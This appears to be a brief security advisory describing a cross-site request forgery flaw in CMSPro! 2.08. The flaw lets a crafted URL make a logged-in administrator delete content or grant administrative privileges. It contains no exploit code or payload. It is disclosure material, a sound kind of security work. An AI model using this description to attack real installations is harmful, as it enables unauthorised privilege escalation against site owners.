# Type : Cross Site Request Forgery (CSRF) Vulnerability


VULNERABILITY DESCRIPTION
CMSPro! 2.08 versions contain a flaw that allows a remote Cross-site Request
Forgery (CSRF) attack. The flaw exists because the application does not
require multiple steps or explicit confirmation for sensitive transactions
for majority of administrator functions such as delete , assigning user to
administrative privilege. By using a crafted URL, an attacker may trick the
victim into visiting to his web page to take advantage of the trust
relationship between the authenticated victim and the application. Such an
attack could trick the victim into executing arbitrary commands in the
context of their session with the application, without further prompting or
verification.
